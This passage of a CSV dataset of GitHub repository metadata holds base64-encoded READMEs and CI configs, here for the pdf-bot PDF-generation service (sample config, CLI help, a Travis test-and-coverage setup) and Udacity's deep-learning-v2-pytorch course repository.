name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
MCwgLy8gMSBtaW51dGUKICAxMDAwICogNjAgKiAzLCAvLyAzIG1pbnV0ZXMK
ICAxMDAwICogNjAgKiAxMCwgLy8gMTAgbWludXRlcwogIDEwMDAgKiA2MCAq
IDMwLCAvLyAzMCBtaW51dGVzCiAgMTAwMCAqIDYwICogNjAgLy8gMSBob3Vy
Cl07Cgptb2R1bGUuZXhwb3J0cyA9IHsKICAvLyBUaGUgc2V0dGluZ3Mgb2Yg
dGhlIEFQSQogIGFwaTogewogICAgLy8gVGhlIHBvcnQgeW91ciBleHByZXNz
LmpzIGluc3RhbmNlIGxpc3RlbnMgdG8gcmVxdWVzdHMgZnJvbS4gKGRlZmF1
bHQ6IDMwMDApCiAgICBwb3J0OiAzMDAwLAogICAgLy8gU3Bhd24gY29tbWFu
ZCB3aGVuIGEgam9iIGhhcyBiZWVuIHB1c2hlZCB0byB0aGUgQVBJCiAgICBw
b3N0UHVzaENvbW1hbmQ6IFsnL2hvbWUvdXNlci8ubnBtLWdsb2JhbC9iaW4v
cGRmLWJvdCcsIFsnLWMnLCAnLi9wZGYtYm90LmNvbmZpZy5qcycsICdzaGlm
dDphbGwnXV0sCiAgICAvLyBUaGUgdG9rZW4gdXNlZCB0byB2YWxpZGF0ZSBy
ZXF1ZXN0cyB0byB5b3VyIEFQSS4gTm90IHJlcXVpcmVkLCBidXQgMTAwJSBy
ZWNvbW1lbmRlZC4KICAgIHRva2VuOiAnYXBpLXRva2VuJwogIH0sCiAgZGI6
IExvd0RCKCksIC8vIHNlZSBvdGhlciBkcml2ZXJzIHVuZGVyIERhdGFiYXNl
CiAgLy8gaHRtbC1wZGYtY2hyb21lCiAgZ2VuZXJhdG9yOiB7CiAgICAvLyBU
cmlnZ2VycyB0aGF0IHNwZWNpZnkgd2hlbiB0aGUgUERGIHNob3VsZCBiZSBn
ZW5lcmF0ZWQKICAgIGNvbXBsZXRpb25UcmlnZ2VyOiBuZXcgaHRtbFBkZi5D
b21wbGV0aW9uVHJpZ2dlci5UaW1lcigxMDAwKSwgLy8gd2FpdHMgZm9yIDEg
c2VjCiAgICAvLyBUaGUgcG9ydCB0byBsaXN0ZW4gZm9yIENocm9tZSAoZGVm
YXVsdDogOTIyMikKICAgIHBvcnQ6IDkyMjIKICB9LAogIHF1ZXVlOiB7CiAg
ICAvLyBIb3cgZnJlcXVlbnQgc2hvdWxkIHBkZi1ib3QgcmV0cnkgZmFpbGVk
IGdlbmVyYXRpb25zPwogICAgLy8gKGRlZmF1bHQ6IDEgbWluLCAzIG1pbiwg
MTAgbWluLCAzMCBtaW4sIDYwIG1pbikKICAgIGdlbmVyYXRpb25SZXRyeVN0
cmF0ZWd5OiBmdW5jdGlvbihqb2IsIHJldHJpZXMpIHsKICAgICAgcmV0dXJu
IGRlY2F5U2NoZWR1bGVbcmV0cmllcyAtIDFdID8gZGVjYXlTY2hlZHVsZVty
ZXRyaWVzIC0gMV0gOiAwCiAgICB9LAogICAgLy8gSG93IG1hbnkgdGltZXMg
c2hvdWxkIHBkZi1ib3QgdHJ5IHRvIGdlbmVyYXRlIGEgUERGPwogICAgLy8g
KGRlZmF1bHQ6IDUpCiAgICBnZW5lcmF0aW9uTWF4VHJpZXM6IDUsCiAgICAv
LyBIb3cgbWFueSBnZW5lcmF0aW9ucyB0byBydW4gYXQgdGhlIHNhbWUgdGlt
ZSB3aGVuIHVzaW5nIHNoaWZ0OmFsbAogICAgcGFyYWxsZWxpc206IDQsCiAg
ICAvLyBIb3cgZnJlcXVlbnQgc2hvdWxkIHBkZi1ib3QgcmV0cnkgZmFpbGVk
IHdlYmhvb2sgcGluZ3M/CiAgICAvLyAoZGVmYXVsdDogMSBtaW4sIDMgbWlu
LCAxMCBtaW4sIDMwIG1pbiwgNjAgbWluKQogICAgd2ViaG9va1JldHJ5U3Ry
YXRlZ3k6IGZ1bmN0aW9uKGpvYiwgcmV0cmllcykgewogICAgICByZXR1cm4g
ZGVjYXlTY2hlZHVsZVtyZXRyaWVzIC0gMV0gPyBkZWNheVNjaGVkdWxlW3Jl
dHJpZXMgLSAxXSA6IDAKICAgIH0sCiAgICAvLyBIb3cgbWFueSB0aW1lcyBz
aG91bGQgcGRmLWJvdCB0cnkgdG8gcGluZyBhIHdlYmhvb2s/CiAgICAvLyAo
ZGVmYXVsdDogNSkKICAgIHdlYmhvb2tNYXhUcmllczogNQogIH0sCiAgc3Rv
cmFnZTogewogICAgJ3MzJzogY3JlYXRlUzNDb25maWcoewogICAgICBidWNr
ZXQ6ICcnLAogICAgICBhY2Nlc3NLZXlJZDogJycsCiAgICAgIHJlZ2lvbjog
JycsCiAgICAgIHNlY3JldEFjY2Vzc0tleTogJycKICAgIH0pCiAgfSwKICB3
ZWJob29rOiB7CiAgICAvLyBUaGUgcHJlZml4IHRvIGFkZCB0byBhbGwgcGRm
LWJvdCBoZWFkZXJzIG9uIHRoZSB3ZWJob29rIHJlc3BvbnNlLgogICAgLy8g
SS5lLiBYLVBERi1UcmFuc2FjdGlvbiBhbmQgWC1QREYtU2lnbmF0dXJlLiAo
ZGVmYXVsdDogWC1QREYtKQogICAgaGVhZGVyTmFtZXNwYWNlOiAnWC1QREYt
JywKICAgIC8vIEV4dHJhIHJlcXVlc3Qgb3B0aW9ucyB0byBhZGQgdG8gdGhl
IFdlYmhvb2sgcGluZy4KICAgIHJlcXVlc3RPcHRpb25zOiB7CgogICAgfSwK
ICAgIC8vIFRoZSBzZWNyZXQgdXNlZCB0byBnZW5lcmF0ZSB0aGUgaG1hYy1z
aGExIHNpZ25hdHVyZSBoYXNoLgogICAgLy8gIU5vdCByZXF1aXJlZCwgYnV0
IHNob3VsZCBkZWZpbml0ZWx5IGJlIGluY2x1ZGVkIQogICAgc2VjcmV0OiAn
MTIzNCcsCiAgICAvLyBUaGUgZW5kcG9pbnQgdG8gc2VuZCBQREYgbWVzc2Fn
ZXMgdG8uCiAgICB1cmw6ICdodHRwOi8vbG9jYWxob3N0OjMwMDAvd2ViaG9v
a3MvcGRmJwogIH0KfQpgYGAKCiMjIENMSQoKYHBkZi1ib3RgIGNvbWVzIHdp
dGggYSBmdWxsIENMSSBpbmNsdWRlZCEgVXNlIGAtY2AgdG8gcGFzcyBhIGNv
bmZpZ3VyYXRpb24gdG8gYHBkZi1ib3RgLiBZb3UgY2FuIGFsc28gdXNlIGAt
LWhlbHBgIHRvIGdldCBhIGxpc3Qgb2YgYWxsIGNvbW1hbmRzLiBBbiBleGFt
cGxlIGlzIGdpdmVuIGJlbG93LgoKYGBgYmFzaAokIHBkZi1ib3QuanMgLS1j
b25maWcgLi9leGFtcGxlcy9wZGYtYm90LmNvbmZpZy5qcyAtLWhlbHAKCgog
IFVzYWdlOiBwZGYtYm90IFtvcHRpb25zXSBbY29tbWFuZF0KCgogIE9wdGlv
bnM6CgogICAgLVYsIC0tdmVyc2lvbiAgICAgICAgb3V0cHV0IHRoZSB2ZXJz
aW9uIG51bWJlcgogICAgLWMsIC0tY29uZmlnIDxwYXRoPiAgUGF0aCB0byBj
b25maWd1cmF0aW9uIGZpbGUKICAgIC1oLCAtLWhlbHAgICAgICAgICAgIG91
dHB1dCB1c2FnZSBpbmZvcm1hdGlvbgoKCiAgQ29tbWFuZHM6CgogICAgYXBp
ICAgICAgICAgICAgICAgICAgIFN0YXJ0IHRoZSBBUEkKICAgIGRiOm1pZ3Jh
dGUKICAgIGRiOmRlc3Ryb3kKICAgIGluc3RhbGwKICAgIGdlbmVyYXRlIFtq
b2JJRF0gICAgICBHZW5lcmF0ZSBQREYgZm9yIGpvYgogICAgam9icyBbb3B0
aW9uc10gICAgICAgIExpc3QgYWxsIGNvbXBsZXRlZCBqb2JzCiAgICBwaW5n
IFtqb2JJRF0gICAgICAgICAgQXR0ZW1wdCB0byBwaW5nIHdlYmhvb2sgZm9y
IGpvYgogICAgcGluZzpyZXRyeS1mYWlsZWQKICAgIHBpbmdzIFtqb2JJZF0g
ICAgICAgICBMaXN0IHBpbmdzIGZvciBhIGpvYgogICAgcHVyZ2UgW29wdGlv
bnNdICAgICAgIFdpbGwgcmVtb3ZlIGFsbCBjb21wbGV0ZWQgam9icwogICAg
cHVzaCBbb3B0aW9uc10gW3VybF0gIFB1c2ggbmV3IGpvYiB0byB0aGUgcXVl
dWUKICAgIHNoaWZ0ICAgICAgICAgICAgICAgICBSdW4gdGhlIG5leHQgam9i
IGluIHRoZSBxdWV1ZQogICAgc2hpZnQ6YWxsICAgICAgICAgICAgIFJ1biBh
bGwgdW5maW5pc2hlZCBqb2JzIGluIHRoZSBxdWV1ZQpgYGAKCiMjIERlYnVn
IG1vZGUKCmBwZGYtYm90YCB1c2VzIGBkZWJ1Z2AgZm9yIGRlYnVnIG1lc3Nh
Z2VzLiBZb3UgY2FuIHR1cm4gb24gZGVidWdnaW5nIGJ5IHNldHRpbmcgdGhl
IGVudmlyb25tZW50IHZhcmlhYmxlIGBERUJVRz1wZGY6KmAgbGlrZSBzbwoK
YGBgYmFzaApERUJVRz1wZGY6KiBwZGYtYm90IGpvYnMKYGBgCgojIyBUZXN0
cwoKYGBgYmFzaAokIG5wbSBydW4gdGVzdApgYGAKCiMjIElzc3VlcwoKW1Bs
ZWFzZSByZXBvcnQgaXNzdWVzIHRvIHRoZSBpc3N1ZSB0cmFja2VyXShodHRw
czovL2dpdGh1Yi5jb20vZXNiZW5wL3BkZi1ib3QvaXNzdWVzL25ldykKCiMj
IExpY2Vuc2UKClRoZSBNSVQgTGljZW5zZSAoTUlUKS4gUGxlYXNlIHNlZSBb
TGljZW5zZSBGaWxlXShodHRwczovL2dpdGh1Yi5jb20vZXNiZW5wL3BkZi1i
b3QvYmxvYi9tYXN0ZXIvTElDRU5TRSkgZm9yIG1vcmUgaW5mb3JtYXRpb24u
Cg==
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICJub2RlIgpzY3JpcHQ6
CiAgLSBucG0gdGVzdAphZnRlcl9zdWNjZXNzOgogIC0gY2F0IC4vY292ZXJh
Z2UvbGNvdi5pbmZvIHwgLi9ub2RlX21vZHVsZXMvY292ZXJhbGxzL2Jpbi9j
b3ZlcmFsbHMuanMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'deep-learning-v2-pytorch',147386085,b'Projects and exercises for the latest Deep Learning ND program https://www.udacity.com/course/deep-learning-nanodegree--nd101',b'Jupyter Notebook',79,2389,,2389,False,b'https://api.github.com/repos/udacity/deep-learning-v2-pytorch/forks',"IyBEZWVwIExlYXJuaW5nIChQeVRvcmNoKQoKVGhpcyByZXBvc2l0b3J5IGNv
bnRhaW5zIG1hdGVyaWFsIHJlbGF0ZWQgdG8gVWRhY2l0eSdzIFtEZWVwIExl
YXJuaW5nIE5hbm9kZWdyZWUgcHJvZ3JhbV0oaHR0cHM6Ly93d3cudWRhY2l0
eS5jb20vY291cnNlL2RlZXAtbGVhcm5pbmctbmFub2RlZ3JlZS0tbmQxMDEp
LiBJdCBjb25zaXN0cyBvZiBhIGJ1bmNoIG9mIHR1dG9yaWFsIG5vdGVib29r
cyBmb3IgdmFyaW91cyBkZWVwIGxlYXJuaW5nIHRvcGljcy4gSW4gbW9zdCBj
YXNlcywgdGhlIG5vdGVib29rcyBsZWFkIHlvdSB0aHJvdWdoIGltcGxlbWVu
dGluZyBtb2RlbHMgc3VjaCBhcyBjb252b2x1dGlvbmFsIG5ldHdvcmtzLCBy
ZWN1cnJlbnQgbmV0d29ya3MsIGFuZCBHQU5zLiBUaGVyZSBhcmUgb3RoZXIg
dG9waWNzIGNvdmVyZWQgc3VjaCBhcyB3ZWlnaHQgaW5pdGlhbGl6YXRpb24g
YW5kIGJhdGNoIG5vcm1hbGl6YXRpb24uCgpUaGVyZSBhcmUgYWxzbyBub3Rl
Ym9va3MgdXNlZCBhcyBwcm9qZWN0cyBmb3IgdGhlIE5hbm9kZWdyZWUgcHJv
Z3JhbS4gSW4gdGhlIHByb2dyYW0gaXRzZWxmLCB0aGUgcHJvamVjdHMgYXJl
IHJldmlld2VkIGJ5IHJlYWwgcGVvcGxlIChVZGFjaXR5IHJldmlld2Vycyks
IGJ1dCB0aGUgc3RhcnRpbmcgY29kZSBpcyBhdmFpbGFibGUgaGVyZSwgYXMg
d2VsbC4KCiMjIFRhYmxlIE9mIENvbnRlbnRzCgojIyMgVHV0b3JpYWxzCgoj
IyMgSW50cm9kdWN0aW9uIHRvIE5ldXJhbCBOZXR3b3JrcwoKKiBbSW50cm9k
dWN0aW9uIHRvIE5ldXJhbCBOZXR3b3Jrc10oaHR0cHM6Ly9naXRodWIuY29t
L3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVy
L2ludHJvLW5ldXJhbC1uZXR3b3Jrcyk6IExlYXJuIGhvdyB0byBpbXBsZW1l
bnQgZ3JhZGllbnQgZGVzY2VudCBhbmQgYXBwbHkgaXQgdG8gcHJlZGljdGlu
ZyBwYXR0ZXJucyBpbiBzdHVkZW50IGFkbWlzc2lvbnMgZGF0YS4KKiBbU2Vu
dGltZW50IEFuYWx5c2lzIHdpdGggTnVtUHldKGh0dHBzOi8vZ2l0aHViLmNv
bS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rl
ci9zZW50aW1lbnQtYW5hbHlzaXMtbmV0d29yayk6IFtBbmRyZXcgVHJhc2td
KGh0dHA6Ly9pYW10cmFzay5naXRodWIuaW8vKSBsZWFkcyB5b3UgdGhyb3Vn
aCBidWlsZGluZyBhIHNlbnRpbWVudCBhbmFseXNpcyBtb2RlbCwgcHJlZGlj
dGluZyBpZiBzb21lIHRleHQgaXMgcG9zaXRpdmUgb3IgbmVnYXRpdmUuCiog
W0ludHJvZHVjdGlvbiB0byBQeVRvcmNoXShodHRwczovL2dpdGh1Yi5jb20v
dWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gvdHJlZS9tYXN0ZXIv
aW50cm8tdG8tcHl0b3JjaCk6IExlYXJuIGhvdyB0byBidWlsZCBuZXVyYWwg
bmV0d29ya3MgaW4gUHlUb3JjaCBhbmQgdXNlIHByZS10cmFpbmVkIG5ldHdv
cmtzIGZvciBzdGF0ZS1vZi10aGUtYXJ0IGltYWdlIGNsYXNzaWZpZXJzLgoK
IyMjIENvbnZvbHV0aW9uYWwgTmV1cmFsIE5ldHdvcmtzCgoqIFtDb252b2x1
dGlvbmFsIE5ldXJhbCBOZXR3b3Jrc10oaHR0cHM6Ly9naXRodWIuY29tL3Vk
YWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2Nv
bnZvbHV0aW9uYWwtbmV1cmFsLW5ldHdvcmtzKTogVmlzdWFsaXplIHRoZSBv
dXRwdXQgb2YgbGF5ZXJzIHRoYXQgbWFrZSB1cCBhIENOTi4gTGVhcm4gaG93
IHRvIGRlZmluZSBhbmQgdHJhaW4gYSBDTk4gZm9yIGNsYXNzaWZ5aW5nIFtN
TklTVCBkYXRhXShodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NTklT
VF9kYXRhYmFzZSksIGEgaGFuZHdyaXR0ZW4gZGlnaXQgZGF0YWJhc2UgdGhh
dCBpcyBub3RvcmlvdXMgaW4gdGhlIGZpZWxkcyBvZiBtYWNoaW5lIGFuZCBk
ZWVwIGxlYXJuaW5nLiBBbHNvLCBkZWZpbmUgYW5kIHRyYWluIGEgQ05OIGZv
ciBjbGFzc2lmeWluZyBpbWFnZXMgaW4gdGhlIFtDSUZBUjEwIGRhdGFzZXRd
KGh0dHBzOi8vd3d3LmNzLnRvcm9udG8uZWR1L35rcml6L2NpZmFyLmh0bWwp
LgoqIFtUcmFuc2ZlciBMZWFybmluZ10oaHR0cHM6Ly9naXRodWIuY29tL3Vk
YWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3Ry
YW5zZmVyLWxlYXJuaW5nKS4gSW4gcHJhY3RpY2UsIG1vc3QgcGVvcGxlIGRv
bid0IHRyYWluIHRoZWlyIG93biBuZXR3b3JrcyBvbiBodWdlIGRhdGFzZXRz
OyB0aGV5IHVzZSAqKnByZS10cmFpbmVkKiogbmV0d29ya3Mgc3VjaCBhcyBW
R0duZXQuIEhlcmUgeW91J2xsIHVzZSBWR0duZXQgdG8gaGVscCBjbGFzc2lm
eSBpbWFnZXMgb2YgZmxvd2VycyB3aXRob3V0IHRyYWluaW5nIGFuIGVuZC10
by1lbmQgbmV0d29yayBmcm9tIHNjcmF0Y2guCiogW1dlaWdodCBJbml0aWFs
aXphdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3dlaWdodC1pbml0aWFsaXph
dGlvbik6IEV4cGxvcmUgaG93IGluaXRpYWxpemluZyBuZXR3b3JrIHdlaWdo
dHMgYWZmZWN0cyBwZXJmb3JtYW5jZS4KKiBbQXV0b2VuY29kZXJzXShodHRw
czovL2dpdGh1Yi5jb20vdWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9y
Y2gvdHJlZS9tYXN0ZXIvYXV0b2VuY29kZXIpOiBCdWlsZCBtb2RlbHMgZm9y
IGltYWdlIGNvbXByZXNzaW9uIGFuZCBkZS1ub2lzaW5nLCB1c2luZyBmZWVk
Zm9yd2FyZCBhbmQgY29udm9sdXRpb25hbCBuZXR3b3JrcyBpbiBQeVRvcmNo
LgoqIFtTdHlsZSBUcmFuc2Zlcl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNp
dHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL3N0eWxl
LXRyYW5zZmVyKTogRXh0cmFjdCBzdHlsZSBhbmQgY29udGVudCBmZWF0dXJl
cyBmcm9tIGltYWdlcywgdXNpbmcgYSBwcmUtdHJhaW5lZCBuZXR3b3JrLiBJ
bXBsZW1lbnQgc3R5bGUgdHJhbnNmZXIgYWNjb3JkaW5nIHRvIHRoZSBwYXBl
ciwgW0ltYWdlIFN0eWxlIFRyYW5zZmVyIFVzaW5nIENvbnZvbHV0aW9uYWwg
TmV1cmFsIE5ldHdvcmtzXShodHRwczovL3d3dy5jdi1mb3VuZGF0aW9uLm9y
Zy9vcGVuYWNjZXNzL2NvbnRlbnRfY3Zwcl8yMDE2L3BhcGVycy9HYXR5c19J
bWFnZV9TdHlsZV9UcmFuc2Zlcl9DVlBSXzIwMTZfcGFwZXIucGRmKSBieSBH
YXR5cyBldC4gYWwuIERlZmluZSBhcHByb3ByaWF0ZSBsb3NzZXMgZm9yIGl0
ZXJhdGl2ZWx5IGNyZWF0aW5nIGEgdGFyZ2V0LCBzdHlsZS10cmFuc2ZlcnJl
ZCBpbWFnZSBvZiB5b3VyIG93biBkZXNpZ24hCgojIyMgUmVjdXJyZW50IE5l
dXJhbCBOZXR3b3JrcwoKKiBbSW50cm8gdG8gUmVjdXJyZW50IE5ldHdvcmtz
IChUaW1lIHNlcmllcyAmIENoYXJhY3Rlci1sZXZlbCBSTk4pXShodHRwczov
L2dpdGh1Yi5jb20vdWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gv
dHJlZS9tYXN0ZXIvcmVjdXJyZW50LW5ldXJhbC1uZXR3b3Jrcyk6IFJlY3Vy
cmVudCBuZXVyYWwgbmV0d29ya3MgYXJlIGFibGUgdG8gdXNlIGluZm9ybWF0
aW9uIGFib3V0IHRoZSBzZXF1ZW5jZSBvZiBkYXRhLCBzdWNoIGFzIHRoZSBz
ZXF1ZW5jZSBvZiBjaGFyYWN0ZXJzIGluIHRleHQ7IGxlYXJuIGhvdyB0byBp
bXBsZW1lbnQgdGhlc2UgaW4gUHlUb3JjaCBmb3IgYSB2YXJpZXR5IG9mIHRh
c2tzLgoqIFtFbWJlZGRpbmdzIChXb3JkMlZlYyldKGh0dHBzOi8vZ2l0aHVi
LmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21h
c3Rlci93b3JkMnZlYy1lbWJlZGRpbmdzKTogSW1wbGVtZW50IHRoZSBXb3Jk
MlZlYyBtb2RlbCB0byBmaW5kIHNlbWFudGljIHJlcHJlc2VudGF0aW9ucyBv
ZiB3b3JkcyBmb3IgdXNlIGluIG5hdHVyYWwgbGFuZ3VhZ2UgcHJvY2Vzc2lu
Zy4KKiBbU2VudGltZW50IEFuYWx5c2lzIFJOTl0oaHR0cHM6Ly9naXRodWIu
Y29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFz
dGVyL3NlbnRpbWVudC1ybm4pOiBJbXBsZW1lbnQgYSByZWN1cnJlbnQgbmV1
cmFsIG5ldHdvcmsgdGhhdCBjYW4gcHJlZGljdCBpZiB0aGUgdGV4dCBvZiBh
IG1vdmlldyByZXZpZXcgaXMgcG9zaXRpdmUgb3IgbmVnYXRpdmUuCiogW0F0
dGVudGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2F0dGVudGlvbik6IEltcGxl
bWVudCBhdHRlbnRpb24gYW5kIGFwcGx5IGl0IHRvIGFubm90YXRpb24gdmVj
dG9ycy4KCiMjIyBHZW5lcmF0aXZlIEFkdmVyc2FyaWFsIE5ldHdvcmtzCgoq
IFtHZW5lcmF0aXZlIEFkdmVyc2FyaWFsIE5ldHdvcmsgb24gTU5JU1RdKGh0
dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0
b3JjaC90cmVlL21hc3Rlci9nYW4tbW5pc3QpOiBUcmFpbiBhIHNpbXBsZSBn
ZW5lcmF0aXZlIGFkdmVyc2FyaWFsIG5ldHdvcmsgb24gdGhlIE1OSVNUIGRh
dGFzZXQuCiogW0JhdGNoIE5vcm1hbGl6YXRpb25dKGh0dHBzOi8vZ2l0aHVi
LmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21h
c3Rlci9iYXRjaC1ub3JtKTogTGVhcm4gaG93IHRvIGltcHJvdmUgdHJhaW5p
bmcgcmF0ZXMgYW5kIG5ldHdvcmsgc3RhYmlsaXR5IHdpdGggYmF0Y2ggbm9y
bWFsaXphdGlvbnMuCiogW0RlZXAgQ29udm9sdXRpb25hbCBHQU4gKERDR0FO
KV0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12
Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2RjZ2FuLXN2aG4pOiBJbXBsZW1lbnQg
YSBEQ0dBTiB0byBnZW5lcmF0ZSBuZXcgaW1hZ2VzIGJhc2VkIG9uIHRoZSBT
dHJlZXQgVmlldyBIb3VzZSBOdW1iZXJzIChTVkhOKSBkYXRhc2V0LgoqIFtD
eWNsZUdBTl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2N5Y2xlLWdhbik6IEltcGxl
bWVudCBhIEN5Y2xlR0FOIHRoYXQgaXMgZGVzaWduZWQgdG8gbGVhcm4gZnJv
bSB1bnBhaXJlZCBhbmQgdW5sYWJlbGVkIGRhdGE7IHVzZSB0cmFpbmVkIGdl
bmVyYXRvcnMgdG8gdHJhbnNmb3JtIGltYWdlcyBmcm9tIHN1bW1lciB0byB3
aW50ZXIgYW5kIHZpY2UgdmVyc2EuCgojIyMgRGVwbG95aW5nIGEgTW9kZWwg
KHdpdGggQVdTIFNhZ2VNYWtlcikKCiogW0FsbCBleGVyY2lzZSBhbmQgcHJv
amVjdCBub3RlYm9va3NdKGh0dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L3Nh
Z2VtYWtlci1kZXBsb3ltZW50KSBmb3IgdGhlIGxlc3NvbnMgb24gbW9kZWwg
ZGVwbG95bWVudCBjYW4gYmUgZm91bmQgaW4gdGhlIGxpbmtlZCwgR2l0aHVi
IHJlcG8uIExlYXJuIHRvIGRlcGxveSBwcmUtdHJhaW5lZCBtb2RlbHMgdXNp
bmcgQVdTIFNhZ2VNYWtlci4KCiMjIyBQcm9qZWN0cwoKKiBbUHJlZGljdGlu
ZyBCaWtlLVNoYXJpbmcgUGF0dGVybnNdKGh0dHBzOi8vZ2l0aHViLmNvbS91
ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rlci9w
cm9qZWN0LWJpa2VzaGFyaW5nKTogSW1wbGVtZW50IGEgbmV1cmFsIG5ldHdv
cmsgaW4gTnVtUHkgdG8gcHJlZGljdCBiaWtlIHJlbnRhbHMuCiogW0RvZyBC
cmVlZCBDbGFzc2lmaWVyXShodHRwczovL2dpdGh1Yi5jb20vdWRhY2l0eS9k
ZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gvdHJlZS9tYXN0ZXIvcHJvamVjdC1k
b2ctY2xhc3NpZmljYXRpb24pOiBCdWlsZCBhIGNvbnZvbHV0aW9uYWwgbmV1
cmFsIG5ldHdvcmsgd2l0aCBQeVRvcmNoIHRvIGNsYXNzaWZ5IGFueSBpbWFn
ZSAoZXZlbiBhbiBpbWFnZSBvZiBhIGZhY2UpIGFzIGEgc3BlY2lmaWMgZG9n
IGJyZWVkLgoqIFtUViBTY3JpcHQgR2VuZXJhdGlvbl0oaHR0cHM6Ly9naXRo
dWIuY29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUv
bWFzdGVyL3Byb2plY3QtdHYtc2NyaXB0LWdlbmVyYXRpb24pOiBUcmFpbiBh
